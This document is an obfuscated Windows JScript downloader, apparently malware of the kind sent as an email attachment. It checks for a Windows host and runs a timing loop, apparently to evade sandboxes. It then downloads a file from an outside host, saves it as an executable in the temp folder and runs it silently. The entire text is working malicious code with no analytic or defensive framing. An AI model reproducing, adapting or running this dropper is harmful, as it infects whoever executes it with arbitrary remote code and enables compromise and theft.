var J0 = false;
var n = "CreateObject";
var Ut = function ZE() {return WScript[n]("WScript.Shell");}(), b = 11;
var o = "MSXML2.XMLHTTP";
var y = 2123213;
var z = 0;
function KR(J){Ut["Run"](J, z, z);};
function MM(){return "" + o;};
function Mx(T, li){z = z * 1; return T - li;};
function qh(){return n;};
/*@cc_on
  @if (@_win32 || @_win64)
    J0 = true;
  @end
@*/
if (J0)
{
var Bh = "";
function W(){return 22;};
var F = 0; var lL = 0;
function h()
{
var B = new this["Date"]();
var M = B["getUTCMilliseconds"]();
WScript["Sleep"](W());
var B = new this["Date"]();
var vX = B["getUTCMilliseconds"]();
WScript["Sleep"](W());
var B = new this["Date"]();
var Zv = B["getUTCMilliseconds"]();
var F = "v";
F = Mx(vX, M);
var lL = "Z";
lL = Mx(Zv, vX);
Bh = "open";
return Mx(F, lL);
}
var mu = false;
var V = false;
for (var kR = z; kR < W() * 1; kR++){if (h() != z){
mu = true; 
lL = "31" + 11 * F + lL; 
V = true; 
break;
}}
function iL() {return ((mu == true) && (mu == V)) ? 1 : z;};
if (mu && iL() && V){
function zN() {return Ut["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "ficRWcMv.exe";};
 Fv = MM();
 z0 = WScript[n](Fv);
 var Qw = 1;
 while (Qw){
try {
z0[Bh]("GET", "http://kingsstaging.consines.in/l9osaw", false);
z0["send"]();
f = "Sleep";
for (;;){WScript[f](W() * 11); if (z0["readystate"] >= 2 * 2) break;};
Qw = z;
} catch(n0){};
}
function SP(S) {var LU0 = (1, 2, 3, 4, 5, S); return LU0;};
N = WScript[qh()]("ADODB.Stream");
Fv = N;
Fv[Bh]();
Fv["type"] = SP(1);
Fv["write"](z0["ResponseBody"]);
N["position"] = SP(z);
Fv["Save" + "ToFile"](zN(), 2);
N["c"+"lose"]();
LU = zN();
KR(LU);
}
}

